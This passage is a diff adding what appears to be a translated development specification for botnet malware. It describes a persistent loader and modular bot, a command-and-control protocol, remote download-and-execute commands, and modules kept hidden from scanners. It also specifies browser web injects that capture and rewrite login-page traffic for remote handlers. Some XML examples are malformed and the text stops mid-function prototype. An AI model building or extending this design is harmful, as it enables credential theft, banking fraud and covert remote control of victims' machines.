@@ -1,0 +1,464 @@
+Resident Loader
+1. autorun - via system scheduler.
+1.1 For Windows: run not at system startup, but every minute. If at the first startup there are permissions to autorun from SYSTEM, then add a task to run from SYSTEM. Otherwise - from the current user. At each startup, check if an instance of the loader is already running using the named pipelines mechanisms (no pipelines naming rule is specified).
+2. Keep communication with the server using the CS2 protocol.
+2.1 It is not necessary to support all commands. For loader, it is necessary to support: /0/, /1/, /5/, /10/, /14/,/23/, /25/,/42/
+2.2 Client id should be saved and not changed between machine restarts.
+
+Modular bot
+1. autorun - via system scheduler.
+1.1 For Windows: start not at system startup, but every minute. If at the first startup there are permissions to autorun from SYSTEM, then add a task to run from SYSTEM. Otherwise - from the current user. At each startup, check if an instance of the loader is already running using the named pipelines mechanisms (no pipelines naming rule is specified).
+2. Keep communication with the server via CS2 protocol.
+2.1 The following commands must be supported: /0/, /1/, /5/, /10/, /14/, /23/, /25/, /30-32/, /41-43/, /62-63/
+2.2 The client id must be saved and not changed between machine restarts.
+2.3 Mandatory verification of all digital signatures
+3 There must be two versions of the bot at once: 32-bit and 64-bit. The 64-bit version of the bot must work on a 64-bit operating system. The bot must be distributed as a single file; when launching it, it detects the system version, pulls out the body of the required version and launches it without saving it to disk.
+4 The system of modules should work. A module is some DLL. Receiving a command to work with the module is done through the incoming command 62, sending data after the execution of the module is done through command 63.
+
+CS2 protocol
+1 The list of servers is set by ip:port list (ip can be ipv4 or ipv6). If the port is even, the interaction is performed via HTTP, if it is odd, then via HTTPS (the certificate is self-signed, certificate checks must be disabled).
+2 Work with the server is done through HTTP requests. They can be both GET and POST.
+2.1 Each request contains three components in the URI separated by "/" - group tag, client id, command code. /<group-tag>/<clientid>/<ccode>/, where group-tag is the group tag, clientid is the client id, ccode is the command code.
+2.1.1 The group tag is an arbitrary string consisting of characters (a-z) and numbers (0-9). The parameter is not case sensitive.
+2.1.2 Client Id is a string consisting of two dot-separated components. The first part has the format <name>_XYYYYYYYYYYY, where name is some name that can somehow identify the machine (computer name or user name, depending on the type of operating system), X is a character denoting the type of system the client is running on (W - windows, L - linux, A - android, M - Mac OS), YYYYYYYYY - 3-7 digits containing major-version, minor-version and build of the operating system if the system has them (for example, for 6. 1 build 7600 it will be 617.1 build 7600 it will be 617600). The second part contains 32 random characters 0-9, A-F. An example of a client id is QWERTY_W617600.11223344556677889900AABBCCDDEEFF. The parameter is not case sensitive.
+2.1.3 The command code is a number between 0 and 999.
+2.2 The fourth and subsequent components in the URI, as well as the request and response body, depend on the command code
+2.3 Commands can be outgoing and incoming, the codes of outgoing and incoming commands cannot overlap. An outgoing command is a command whose code is specified in the request URI, an incoming command is a command that comes in response to an outgoing command with code 1.
+3 Sequence of work with the server
+3.1 Before work it is necessary to check the server. If the server was checked less than 4 hours ago, the check is not necessary. The check is performed by requesting a file named "spk". The file from the server is requested via /5/. The file is the server certificate (see paragraph 10.2) inside the universally signed configure
+3.2 After successful verification, the command request session must be initialized. Initialization is done via /0/
+3.3 After successful initialization, a cycle of 100 consecutive /1/ requests is started.
+3.4 If an error occurs as a result of sending an HTTP request or receiving an HTTP response, the request must be repeated. A successful result is when the server responds with HTTP codes 200, 403 or 404.  If there is no successful result after 3 retries, the retries are performed after 15 seconds. Any other code means failure to send a request or receive a response.
+If the request for the /1/ command fails after all repetitions, the client must take the next server on the list and start the process over again: server check, /0/ command and 100 /1/ commands. If the client reaches the end of the server list, it must start over and so on ad infinitum. If 100 commands /1/ completed successfully, still take the next server and repeat the process.
+4 The client's main config is flashed into it when it is created. It can be updated while it is running on the target machine. The main config has an inherent property - version. The version of the main config is an arbitrary 32-bit unsigned number. It is possible to update the config on the client only if the version of the new config is strictly greater than the previous one. See section 10.1 for a detailed description of the config
+4.1 A new master config is requested via the outgoing command /23/ every 3 hours.
+5 Digital signature of the server is not used in the current implementation, instead a stub is used which gives the string "1234567890" instead of the signature.
+6 The config digital signature is a 384-bit ECDSA digital signature with SHA2-384 hashing algorithm. The signature standard must be compatible with the Microsoft BCRYPT_ECDSA_P384_ALGORITHM algorithm from the CNG library.
+7 Outgoing commands
+7.1 /0/ - initialization of the cycle for receiving incoming commands. It has 5 parameters. The request format for the /0/ command is:
+/<group-tag>/<clientid>/0/<system-version>/<client-version>/<client-self-ip-address>/<devhash>/<token-string>/
+system-version - name of operating system with version, service pack and architecture (32, 64 bit)
+client-version - client version, arbitrary number greater than 1000
+client-self-ip-address - client's own external ip-address (ipv4 and ipv6) in string representation. It is obtained by the client itself by means chosen at the developer's discretion.
+token-string - a random string of 16 to 32 characters. It can contain large and small English characters and digits from 0 to 9. Case sensitive
+devhash - hardware identifier. An arbitrary HEX string (characters 0-9, A-F) representing some 256-bit hash that depends on the hardware or operating system the client is running on. A devhash calculated multiple times on the same machine should always be the same.
+The server response is a file (content-type: binary) of the following content:
+/1/<group-tag>/<clientid>/<token-string>/<binary-content-length>/\r\n<binary-content>\r\n<server-sign>
+binary-content-length - length of binary-content block in bytes
+binary-content - binary data block. This is an extended server config
+server-sign - digital signature of the server, it includes the content of the response from the first byte to the second \r\n string translation (\r\n characters are included in the digital signature).
+7.2 /1/ - request for incoming command. The command has one parameter - a random string, which will be duplicated in the parameters of the incoming command. It is identical to the token-string parameter from the /0/ command. Incoming commands are described in more detail in paragraph 8
+7.3 /5/ - request a file or config from the server. The command has one parameter - file name. The file name can contain English characters and numbers, the file name is case sensitive. In response to the code /5/, the server outputs a file (content-type: binary). An example of a request with code 5 is /test1/QWERTY_W617600.11223344556677889900AABBCCDDEEFF/5/spk/.
+If it fails, the server returns a 403 or 404 code.
+7.4 /10/ is a report of a completed incoming command. The query format for the /10/ command is:
+/<group-tag>/<clientid>/10/<incode>/<cmd-id>/<result-code>/
+incode - code of the executed incoming command
+cmd-id - identifier of the executed incoming command.
+result-code - code of the result of the executed incoming command. The number from 0 to 999.
+The server always responds to this request with the string "/1/" (Content-type: text/plain).
+7.5 /14/ - saving the key-value pair to the server.
+Request format:
+/<group-tag>/<clientid>/14/<name>/<value>/0/
+name - key. Arbitrary string with English upper and lower case letters, numbers and dot, "+" and "-" symbols.
+value - value. Arbitrary string, all special characters must be urlencoded.
+The third parameter is always zero.
+The response to this command is always the same: HTTP 200, Content-type: text/plain, response body content "/1/"
+7.6 /23/ - output the main config to the client. It has only one additional parameter - the version of the current client's config.
+Example of client request:
+/<group-tag>/<clientid>/23/<current-config-version>/
+current-config-version - current config version.
+
+Example server response:
+/23/<group-tag>/<clientid>/<config-version>/<binary-content-length>/\r\n
+<binary-content>/\r\n
+<server-sign>
+binary-content - binary content of the config
+config-version - version of the config in binary-content
+binary-content-length - binary-content length in bytes written as a string
+
+If there is no file on the server that satisfies the conditions for this client, the server should respond with HTTP 404. The binary-content is the client's new main config. The client should check the main config, extract the version that is written in it. The version that is written in it, must be strictly equal to the version that is specified in the config-version parameter in the server response. At the same time, this version must be strictly greater than the current config version used by the client. After all checks, the client must unconditionally and immediately start using the new master config.
+The client may request a new master config no more often than once every 4 hours.
+
+7.7 /25/ - request a new body. The command has no parameters.
+Example of client request:
+/<group-tag>/<clientid>/25/<token-string>/.
+token-string -identical to the parameter in the command /1/
+
+Example server response:
+/25/<group-tag>/<clientid>/<token-string>/\r\n
+<link>\r\n
+<server-sign>
+
+If there is no link satisfying the conditions of this client, the server responds with HTTP 404. The link issued by the server is designed according to all the rules of URL. This link contains a new body (executable module) for the client. This file is packed into a universal signed config. After all the checks, this file should be replaced with your own executable.
+The request for a new body is made by the client not more often than once every 4 hours. Whether or not to restart immediately after updating the body is a matter for the developer's discretion.
+7.8 /60/
+7.9 /63/ - sending module data.  The command has the following parameters: module name, ctl to module, resulting ctl string, auxiliary tag, ctl_OutData. The resulting ctl string, auxiliary tag and ctl OutData are optional. The "ctl_OutData" parameter is a block of arbitrary binary data and is passed in the body via multipart/form-data, the name of the parameter inside multipart/form-data is "noname". If ctl_OutData is present in the request, the request is passed by POST method.
+Example client request
+/<group-tag>/<clientid>/63/<module name>/<ctl>/<ctl-result-string>/<aux-tag>//
+module name - the string consists of English letters only, maximum length 64 characters
+ctl - string consists of English letters and numbers only, maximum length 64 characters
+ctl-result-string - string in base64 format
+aux-tag - auxiliary tag, the string consists of English letters and numbers only, maximum length 128 characters. The field is necessary for the convenience of searching in the table, it is assumed that this column in the table will have an index.
+ctl_OutData - is passed in the body of POST-request and contains a block of arbitrary binary data. The maximum size is 32 MB.
+The server response is either always 200 - "/1/" or 403 if the client is not in the database or has sent /0/ too long ago.
+7.10 /64/ - report on the event in the module. The command has the following parameters: module name, event name, event information, auxiliary tag, event data. Event information, auxiliary tag and data are optional. Event information is a UTF-8 encoded string with a maximum length of 64 KB (bytes, not characters). The data parameter is a block of arbitrary binary data and is passed in the body via multipart/form-data, the name of the parameter inside multipart/form-data is "data" and the name of the event information parameter is "info". If the request contains data or event information, the request is passed using POST method.
+An example of a client request
+/<group-tag>/<clientid>/64/<module name>/<event-name>/<aux-tag>/
+module name - the string consists of English letters only, maximum length 64 characters. It is assumed that there will be an index on this column in the table.
+event-name - the string consists of English letters and numbers only, maximum length 64 characters.
+aux-tag - auxiliary tag, the string consists of English letters and numbers only, maximum length 128 characters. The field is necessary for the convenience of searching in the table, it is assumed that this column in the table will have an index.
+Server response is either always 200 - "/1/", or 403 if the client is not in the database or he sent /0/ too long ago.
+
+8 Incoming commands are sent by the server in response to the /1/ query. The server responds to this query with a file (content-type: binary). The file has the following format:
+/<incode>/<group-tag>/<clientid>/<token-string>/<cmd-id>/\r\n<command-params>\r\n<server-sign>
+incode - incoming command code
+token-string - string copied from command parameter /1/ of GET-request
+cmd-id - identifier of the issued command, an arbitrary string with large and small English characters, digits from 0 to 9 and symbols -,+,dot,#. Case sensitive
+command-params - an arbitrary string with parameters (must not contain the characters \r\n as it means the end of the string).
+server-sign - digital signature of the server, it includes the content of the response from the first byte to the second translation of the string \r\n (\r\n characters are included in the digital signature).
+If there is no incoming command for the client, the response is a 3 character string "/1/", Content-type: text/plain.
+8.1 /30/ - system restart.
+8.2 /31/
+8.3 /32/
+8.4 /41/ - start executable file
+8.5 /42/ - start the executable file according to the alternative scheme. The command parameter is a string with the configuration of the file launching by alternative scheme (paragraph 10.8).
+8.11 /62/ - command to module.  The command parameter consists of three space-separated components: module name, module command (ctl) and module command argument (arg). The module name can contain only English letters (case is not important), the command to module can contain English letters (case is not important) and digits, the command argument is an arbitrary data block in base64 format.
+Example of the parameter of the incoming command 62:
+testMod status ZnVmYWlrYQ==
+where "testMod" is the module name, "status" is the command to the module, "ZnVmYWlrYQ==" is the command argument to the module.
+The commands "start" and "release" are reserved commands
+8.12 /70/
+8.13 /71/
+8.14 /666/
+8.16 Responses to incoming commands
+8.16.1 Code 1 - successful execution of the command
+8.16.2 Code 2 - incorrect command parameter specified
+8.16.3 Code 3 - invalid digital signature of the configure
+8.16.4 Code 4 - unable to download file by link
+8.16.5 Code 5 - file is corrupted
+8.16.6 Code 6 - system function failed when launching a file for execution
+
+9 The Universal Signed Config is a container for all files that require authentication. It consists of a 48 byte header and an encrypted part.
+The point of signing the config is to protect against control hijacking of the entire botnet. By hijacking the control of a C&C server or spacer (e.g., a host, or a rat), the list of C&C spacers in the config can be spoofed, and network control can be hijacked. If the config is signed, then in addition to hijacking the server, you need to mine the keys.
+9.1 The 48 byte header is used to compute Keu, IV to decrypt the data. To calculate Keu for AES256-CBC decryption, the following calculations must be done: take the first 32 bytes of the header, calculate its SHA256 hash and add it to the end of these 32 bytes, resulting in 64 bytes, again calculate the SHA256 hash from these 64 bytes and add it to the end, then again calculate the SHA256 hash from the resulting 96 bytes and add it to the end, and so repeat until the data size reaches 4096 bytes. The SHA256 hash from the resulting 4096 bytes data block will be Key for AES256-CBC.  
+To calculate IV for AES256-CBC decryption it is necessary to perform the following calculations: take 32 bytes of header starting from 16 bytes and up to the end (byte numbering from zero), calculate its SHA256 hash and add it to the end of these 32 bytes, it turns out to be 64 bytes, again calculate SHA256 hash from these 64 bytes and add it to the end, then again calculate SHA256 hash from the resulting 96 bytes and add it to the end and so repeat until the data size reaches 4096 bytes. The first 16 bytes of the SHA256 hash from the resulting 4096 byte data block will be the IV for AES256-CBC.  
+Thus, we get this scheme of calculations (the "+" operation is a concatenation of binary blocks):
+Key
+data0 = header[0:31]
+data1 = data0 + sha256(data0)
+data2 = data1 + sha256(data1)
+data3 = data2 + sha256(data2)
+data4 = data3 + sha256(data3)
+...
+data127 = data126 + sha256(data126)
+/size data127 - 4096 bytes
+Key = sha256(data127)
+
+IV
+data0 = header[16:47]
+data1 = data0 + sha256(data0)
+data2 = data1 + sha256(data1)
+data3 = data2 + sha256(data2)
+data4 = data3 + sha256(data3)
+...
+data127 = data126 + sha256(data126)
+/size of data127 is 4096 bytes
+IV = sha256(data127)[0:15]
+We end up with a 256 bit Key and a 128 bit IV to perform the AES256-CBC decryption.
+9.2 The cipher part is a multiple of 16 bytes, it is an encrypted block using the AES256-CBC algorithm.
+9.3 Before encryption, the data shall be complemented so that its length is a multiple of 16 bytes. The alignment is done according to the PKCS7 padding standard (16).
+9.4 Before encryption, the original data may optionally be compressed using the LZO algorithm. Before encryption, the data is supplemented with an 8-byte header at the front and a digital signature of the configuration (ECDSA384, hashing algorithm SHA-2-384) at the end, whereby the 8-byte header added at the front is included in the digital signature. The 8-byte header consists of two DWORD values: the first value is the size of the original data, the second value is the bit flags.
+9.5 Thus the algorithm for creating a universally signed config is as follows:
+9.5.1 First, the original data is compressed as necessary.
+9.5.2 The prepared original data is augmented at the front with an 8-byte header with the size of the data (if compressed, the size of the compressed data) and flags. The end is appended with a digital signature of the config (ECDSA384/SHA384, the front-added 8-byte header is included in the digital signature)
+9.5.3 The resulting data block is then padded so that it is a multiple of 16 bytes in length using the PKCS7 padding algorithm (16).
+9.5.4 A 48 byte block of random data is generated.
+9.5.5 Based on the block generated in 9.5.4, Key and IV are calculated.
+9.5.6 The data generated in 9.5.3 shall be encrypted using the AES256-CBC algorithm.
+9.5.7 To the block generated in clause 9.5.4 is added at the end the data obtained as a result of encryption in clause 9.5.6.
+10 Configs
+10.1 Main client config
+This is an XML text file inside the universal signed config (clause 9). It contains the group tag, the config version, a list of servers, and the config names of static injects and dynamic injects. An example of a basic client config:
+<mcconf>.
+<ver>14000</ver>
+<gtag>test2</gtag>
+<servs>
+<srv>1.2.3.4:443</srv>
+<srv>5.6.7.8:443</srv>
+...
+<srv>51.62.71.83:443</srv>
+</servs>
+<stinj>name1</stinj>
+<dyinj>name2</dyinj> <smst>name3<smst>
+</mcconf>.
+The main client config is always inside the universal signed config.
+10.2 A server certificate is a text XML file that contains its validity period (other data may be available in future implementations).
+Example of a server certificate:
+<ssert>
+<expir>1451069714</expir>
+</ssert>
+The expir tags contain the date after which the certificate ceases to be valid. The date is specified in EPOCH time format. Working with a server with an invalid certificate is forbidden.
+The server certificate is always inside the universally signed config.
+
+10.3 The extended server config is a text XML file with the validity period (other data may be available in future implementations) and addresses of additional servers. The current implementation does not use any additional servers. The only thing that is required is to check the validity of the config.
+<servconf>
+<expir>1451069714</expir>
+<plugins>
+<psrv>2.3.4.5:443</psrv>
+<psrv>21.31.41.51:443</psrv>
+</plugins>
+<datapost></datapost>
+</servconf>
+The expir tags contain the date after which the extended server config ceases to be valid. The date is specified in EPOCH time format. Working with a server with invalid certificate is forbidden.
+The plugins tag contains a list of servers where modules are stored. Each of them is a server that supports only one /5/ command. All modules must be requested from them. If there is no <plugins> tag in the extended server config, then the bot will not support modules at all.
+The extended server config is always inside the universal signed config.
+10.4 Dynamic injection config is a text XML file in standard ANSI encoding, which contains rules for processing HTTP responses from servers. The config describes the list of http(s)-link masks to be processed, the address of the handler and additional flags.
+The config is organized as an array of elements in <igroup> tags.  Each <igroup> contains an unlimited number of elements in <dinj> tags.  Each <dinj> element describes the rule of HTTP response processing. It contains the reference mask, the address of the handler and additional flags: whether to send the requested http-request and priority. The link mask is in the <lm> tag in the "value" attribute, the handler address in the <hl> tag, whether to send the requested http-request in the <sq> tag and the priority <pri>.
+The parameter in the <sq> tag contains a non-negative numeric value. If it is equal to zero, it is not necessary to send the http-request to the handler, if it is equal to one, it is necessary to send only the request header to the handler, if it is equal to number 2, it is necessary to send the whole request to the handler. The parameter in the <sq> tag may not exist at all, in this case it is considered to be equal to zero.
+Priority in the <pri> tag contains a non-negative numeric value. If the priority is not specified, its value is equal to the maximum positive 32-bit value (signed int) - 2 147 483 647. A priority value equal to zero is allowed.
+Handler address is an http-link of the handler on the remote server. The link is always prefixed with http:// or https://.  If the prefix is https:// then HTTPS protocol should be used to communicate with the handler.
+The link mask is some expression containing the asterisk, question mark and square brackets "[]". An asterisk denotes any sequence of characters, including an empty sequence. A question mark indicates any single character. Square brackets list a list of single characters, e.g., [jeu] can only be replaced by one of the three characters "j", "e", or "u". , "e" or "u", [?] - only question mark character, [[] - only opening square bracket, [*] - only asterisk character, [[*] - asterisk or opening square bracket.
+Пример: q[abc]erty[?]u[[]uu??88]88*
+qaerty?u[uuzz88]88444 - fits.
+qbertysu[uuzz88]88444 - not suitable
+qcerty?u[uuz88]88 - does not fit.
+qaerty?u[uuz?88]88 - fits.
+qrerty?u[uuz?88]88 - does not fit.
+qaerty?u!uuz?88]8811 - does not fit.
+The link mask never includes the http(s):// prefix and the link is checked without this prefix.
+Example of dynamic injects config:
+<igroup>
+<dinj>
+<lm value="*/logon/*"/>
+<hl>http://14.25.36.47/test2.php</hl></dinj>
+</igroup>
+<igroup>
+<dinj> <lm>*test*.com/qwerty[?]*</lm>
+<hl>https://1.2.3.4/test2.php</hl></dinj>
+<dinj>
+<lm value="???site.net/cderfv.asp*">
+
+<lm>
+<hl>https://1.2.3.4/test2.php</hl>
+<pri>1</pri>
+<sq>1</sq>
+</dinj>
+<dinj>
+<lm>[abcdef]wert[1234567890].com/papka/userprofile.php</lm>
+<hl>https://1.2.3.4/test.php</hl>
+<pri>10</pri>
+</dinj>
+</igroup>
+<igroup><dinj>
+<lm>*/sitelogin/*</lm>
+<hl>http://41.24.53.64:8089/test.aspx</hl>
+<pri>45</pri><sq>2</sq>
+<dinj> </igroup>
+In this example, one igroup has three dinj in it, the other two have one dinj each.
+Additional tags can be specified inside the lm tag, specifying additional conditions for using the link or ignoring it.
+ignore_mask - ignore if the link satisfies the mask specified in the value attribute. If several ignore_mask tags are specified, the link is ignored if it matches at least one of them.
+ignore_header - ignore if the response contains a header that satisfies the header and value attributes. If more than one ignore_header tag is specified, the link is ignored if it matches at least one of the specified ones. Values in header and value attributes can be specified as masks.
+require_header - additional check on header, if the response contains a header that matches the parameters of the header and value attributes, it will be sent for processing. If several require_header tags are specified, the link is accepted for processing only if it matches each of them. Values in header and value attributes can be specified as masks.
+<dinj>
+  <lm value="example.com/*">
+    <ignore_mask value="*.css"/>
+    <ignore_mask value ="*.rar"/>
+    <ignore_header header="content-type" value="text/plain"/>
+   <require_header header="content-lang" value="*"/>
+  </lm>
+  <hl value="test.net/handler.php">
+</dinj>
+In the above config snippet, the example.com/assetst/test.css link will be ignored and the example.com/assetst/test.html link will only be processed if the server response contains a content-lang header.
+10.4.1 Processing of an HTTP response begins only after its contents have been fully received from the server (in the AfterReceiveResponse collab in the browser interceptor code). If the link of the request to which the response is received, fits several <dinj> elements located in different <igroup> (at least one located in a separate <igroup>), then such a link should be skipped without processing.
+After it is completely received, it is necessary to send a POST-request to the address of the handler. If there are several <dinj> elements with a mask that satisfy this link and they are all in the same <igroup>, they should all be polled in turn according to their priorities in ascending order (the first is the handler with the lowest priority value). If there are several handlers in the list with the same priority, this situation should be resolved at the developer's discretion. It is understood that the config designer must take care that such situations do not arise.
+The body of a POST-request is in nultipart/form-data format. It should contain the following elements:
+sourcelink - the full sought link with the prefix https:// or http:// (if there is no way to know which protocol, always put https://) in ANSI encoding.
+sourcequery - http-request, depends on the value in the sq parameter in <dinj>. The parameter may be absent if the value in the sq parameter is zero.
+sourcehtml - sought http-response. Full server response from beginning to end with all hiders, unchanged, in the sought encoding.
+In addition to the parameters in the body, the request URI must contain the following parameters in urlencode format: cid - client identifier, clientid as a string (see section 2.1.2).
+group - client group tag as a string.
+Handler response:
+200 - the handler has modified the page and the response body contains the new modified server response with all hiders to be substituted to the browser. No other handlers should be called.
+303 - the handler has not changed the page and still allows access to other handlers, if any.
+304 - the handler has not changed the page and at the same time prohibits access to other handlers
+All other codes should be considered as response 303, after which the given <dinj> element (or some object or structure in memory that describes the given <dinj> element) should be deactivated for 30 minutes and not participate in processing in any way. The deactivation must be local only to the current process.
+10.5 Static Injects Config is a text XML file in standard ANSI encoding that specifies the rules for processing HTTP server responses. The config describes a list of redirects.
+Unlike dynamic injections, static injections are at a lower level and block sending http-requests to the original server and completely substitute http-responses (if any) of the original server.
+The config describes a list of static injects. The list of static injects is specified in the <slist> tag. The <slist> tag is possessed by the list of elements in the <sinj> tags. Each sinj element contains: the trigger mask in the <mm> tag, the link on which the injection will be enabled <sm>, the name of the handler server <srv>, the new value of the host field in the request headers <nh>.  The sm tag is optional, in which case it is assumed to be equal to the contents of the mm tag.
+Each static injection can be in three states: "ready", "on" and "off". Initially, it is in the "ready" state and stays there until a transition to the link specified in the sm tag takes place. As soon as a transition to this link occurs, the static injection switches to the "on" state.  The inject can switch to the "on" state only from the "ready" state. The injection can move to the "ready" state only from the "off" state
+It is implied that the decision to switch the injection from the "ready" state to the "on" state is made in the CheckURL colback. The decision to transition an injection from the "on" state to the "off" state occurs in the AfterReceiveResponse callback.
+Trigger mask (mm tag) - a mask identical to the mask in the configuration of dynamic injections. All requests matching this mask must be directed to the server handler
+Reference mask on which the injection will be enabled or just the enable mask (sm tag or mm tag) - the mask of the reference on which the injection switches from the "ready" state to the "enabled" state.
+Handler server (srv tag) - a pair of ip:port values that points to the handler server. If the port value is even, it works without encryption (HTTP), if the port is odd, it works over SSL/TLS (HTTPS).
+New host value (tag nh) - the value of the host field that will replace the original value of the host field in the header of the outgoing request.
+Example config:
+<slist>
+<sinj>
+<mm>site.com/*</mm>
+<sm>site.com/loginpage</sm>
+<nh>othersite.com</nh>
+<srv>11.22.33.44:80</srv>
+</sinj>
+<sinj>
+<mm>qwerty1.net/papka2/*</mm>
+<nh>zxc.org</nh>
+<srv>1.2.3.4:443</srv>
+</sinj>
+<slist>
+
+10.5.1 As the simplest analogy to static injects, we should consider redirecting some pages. So, let's say we are in the BeforeSendRequest callback, and after checking the link for all injects that are in the "on" state, it became clear that this link fits some inject, it is necessary to redirect the request to the server-handler.
+To redirect it is necessary to copy the outgoing request, change the host field in the copy to the one specified in the config in the tag "nh", add the header "X-Forwarded-for" with its own external ip-address, and the header "clientinfo" which will contain first the tag of the client group, and then through a space its full clientid, about. After these modifications, you should send the request to the handler server. If the server port is even, it should be sent without encryption, if the port is odd, it should be sent via SSL/TLS. It is recommended to send the request asynchronously or just in a separate thread.
+The original request to the original server should be modified so that it becomes a GET request with URI equal to "/", remove the header with cookie and other specific tags, then send it to the original server.
+After receiving a response from the original server, in the AfterReceiveResponse callback you should wait until the response from the processing server arrives. After that, replace the response from the original server (full header and body) with the response from the processing server.
+Among other things, the handler server's response may contain one special tag named "sinjdsto" in which a numeric value is specified. The presence of this hider in the handler server response means that the static injection should be switched from the "on" state to the "off" state. The numeric value indicates the number of seconds after which the static injection will be automatically switched from the "off" state to the "ready" state. When replacing the response of the original server with the response of the handler server, the header "sinjdsto" should be removed.
+It is understood that in the configuration of static injects all triggering masks (and, accordingly, masks of switching on) do not overlap with each other. It is assumed that the CheckURL callback link will work only on one enable mask, and the BeforeSendRequest callback link will work only on one trigger mask. Otherwise, it is up to the developer to resolve the situation. It is understood that the config author will take care of the uniqueness of the masks in the "sinj" tags.
+If the AfterReceiveResponse colback knows that the request was processed by a static injection, then it should not be processed by a dynamic injection. Thus, static injections take precedence over dynamic injections.
+10.6
+10.7 A file startup config is
+10.8 An alternate file startup config is a base64 encoded block with information about where to download the file from and how to start it. After decoding the config, which is an ordinary base64 encoded string, you should get the following block of binary data:
+flags - DWORD type, not used in the current implementation and always equal to zero.
+SHA256 hash of the executable file, 32 byte block of binary data,
+WORD - length of the link to download the file,
+AnsiString - link to download the file.
+Sign - digital signature of the configuration.
+10.8.1 When receiving an incoming /42/ command, the client must decode its parameter from base64 and get a block of binary data. After that it should check the length of the download link and the size of the remaining block where the digital signature should be located. The digital signature always has a fixed size. If the checks fail, it should report to the server the result of the command with code 2.
+10.8.2 If the checks are successful, the validity of the digital signature must be checked. If the digital signature is not valid, it is necessary to report to the server about the result of execution of the command with code 3.
+10.8.3 After successful verification of the digital signature it is necessary to download the executable file from the link. If the download is successful, the file should be checked by SHA256 hash. If the download is unsuccessful, it should be repeated 3 times with a break of 15 seconds. If after all the attempts the file could not be downloaded, it is necessary to report to the server about the result of the command with the code 4.
+10.8.4 If after downloading the file its hash does not match the one received from the server, then it is necessary to report to the server about the result of the command with code 5.
+10.8.5 If the hash check is successful - run the executable file. If the system function returns an error, it is necessary to report to the server about the result of the command with the code 6.
+
+Bilder
+1 Bilder should have the following functionality
+1.1 Generate a key pair (private-public) for the config. The key is binary compatible with BCRYPT_ECDSA_P384_ALGORITHM from Microsoft's CNG library. The output is two files with public and private key in binary form without transformations.
+1.2 Pack an arbitrary file into a universal signed config. Input data: original file, private key of the config. Output: a file containing a universal signed config.
+1.3 Extract original data from a universally signed config with or without verification by the config's public key. Input data: universal signed config, public key of the config (if file validation is required). Output: original file
+1.4 Decrypt universal signed config. The output should be a file with an 8 byte header, original data, and a digital signature. Input data: universal signed config. Output: a file with 8 byte chider and signature.
+1.5 Check server operability by ip-address and port pair. Input data: public key of the config, ip:port of the server.
+1.6 Same as item 1.5, but by server list. Input data: public key of the config, list of ip:port servers.
+1.7 Generate client. Input data: public key of config, main config of client, original executable file-template of client. Output: exe-file
+2 Bilder should be designed as a GUI application for Windows or Linux.
+
+
+Windows modules
+1 A Windows module is a DLL with several exportable functions.  The DLL can be loaded into a running process, or it can be loaded into a specially created zombie process. There is one important condition: the body of the module is never saved to disk in an open form, even when the module is launched directly. For long-term storage of modules, they should be stored in a universal signed config (in the form in which they were downloaded from the server) or in some other form to prevent automatic scanners from searching for the module.
+2 The module is requested the first time it is used from the module server, via the /5/ command by its full name. It is located inside the universal signed config. After a successful download, the module is requested again every 72 hours. If the attempt to update the module is unsuccessful, it must be retried after 30 minutes. The very first request for a module from the module server must be made at the time of first use on the bot.
+3 Each module has an inherent property - a name. The module name contains only English letters. Any module always contains two versions: 32-bit and 64-bit. When downloading a module from the server, you should specify its name and add "32" or "64". For example, if the module name is "qwerty", then the 32-bit version will be named "qwerty32" and the 64-bit version will be named "qwerty64". The name of the module with the addition of the digits "32" or "64" make up its full name. An example of requesting the 32-bit version of the "xyz" module is /test1/QWERTY_W617600.1122333344556677889900AABBCCDDEEFF/5/xyz32/.
+4 Only 64-bit versions of modules are run on a 64-bit system. Thus, the 64-bit version of the above logic requests only 64-bit versions of modules, the 32-bit version of the above logic requests only 32-bit versions of modules.
+5 The module always runs in only one instance.
+6 The module exports the following functions: Start, Control, Release, FreeBuffer. All functions have a stdcall call conversion and are exported by name.
+6.1 The Start function has the following prototype:
+PVOID Start(
+	LPCSTR ModuleName,
+	LPCBYTE Arg,
+	SIZE_T ArgLen,
+	LPSTR ResultInfo,
+	const ParentInfo* pParentData,
+	PVOID EventCallback,
+	PVOID EventCallbackContext,
+	PVOID Reserved1);
+The function is called when ctl "start" is received from the server
+ModuleName - module name
+Arg - argument of the start command
+ArgLen - size of CtlArg parameter in bytes
+ResultInfo - buffer for the resulting ctl string. The buffer has a fixed length of 1024 bytes.
+pParentData - information about the above logic, controlled by the module's configure
+EventCallback - pointer to the event handler function.
+EventCallbackContext - pointer parameter that should be passed to the handler from the module.
+In case of success, the function returns a descriptor to be used when calling Control and Release functions. In case of failure, the function returns null.
+
+typedef struct ParentInfo {
+	CHAR ParentID[256];
+	CHAR ParentGroup[64]; CHAR SelfIP[64]
+	CHAR SelfIP[64];
+	LPCWSTR ParentFiles;
+} ;
+ParentID - the full client ID of the above logic
+ParentGroup - grouping tag of the above logic
+SelfIP - external IP address
+ParentFiles - not used
+The fields in the structure are filled by the bot depending on its config (<needinfo> tag).
+6.2 The Control function has the following prototype
+BOOL Control (
+	PVOID ModuleHandle,
+	LPCSTR Ctl,
+	LPCBYTE CtlArg,
+	SIZE_T CtlArgLen,
+	LPSTR CtlResultInfo,
+	PVOID* ppOutData,
+	PDWORD pOutDataSize,
+	LPCSTR pOutDataTag,
+	PVOID Reserved1);
+The function is called when a ctl different from "start" and "release" is received from the server
+ModuleHandle - module descriptor returned by the Start function.
+Ctl - string containing ctl to the module
+CtlArg - argument of ctl to module
+CtlArgLen - size of the CtlArg parameter in bytes
+ResultInfo - buffer for the resulting ctl string. The buffer has a fixed length of 1024 bytes.
+ppOutData - pointer to the variable where the pointer to the buffer with ctl output data (ctl_OutData) will be saved.
+pOutDataSize - pointer to the variable into which the data size in the buffer with output data will be saved ctl
+pOutDataTag - buffer for the auxiliary tag that will be sent to the server. The buffer has a fixed length of 128 bytes
+The function returns TRUE in case of success, otherwise the function returns FALSE. In case of success, if the value of *ppOutData after the call is not equal to zero, then this buffer must be released through the FreeBuffer function
+6.3 The Release function has the following prototype
+VOID Release (
+	PVOID ModuleHandle);
+The function implements the complete termination of the module. Its tasks include deleting all the resources used during the module operation. The function is called when the "release" command is received from the server.
+6.4 The FreeBuffer function has the following prototype
+VOID FreeBuffer (
+	PVOID pMemory);
+The function frees the buffer allocated inside the Control function (parameter ppOutData).
+6.5 The event handler has the following prototype
+VOID EventCallback (
+	PVOID ModuleHandle,
+	LPCSTR EventName,
+	LPCSTR EventInfo,
+	PVOID pOutData,
+	DWORD OutDataSize,
+	LPCSTR pOutDataTag,
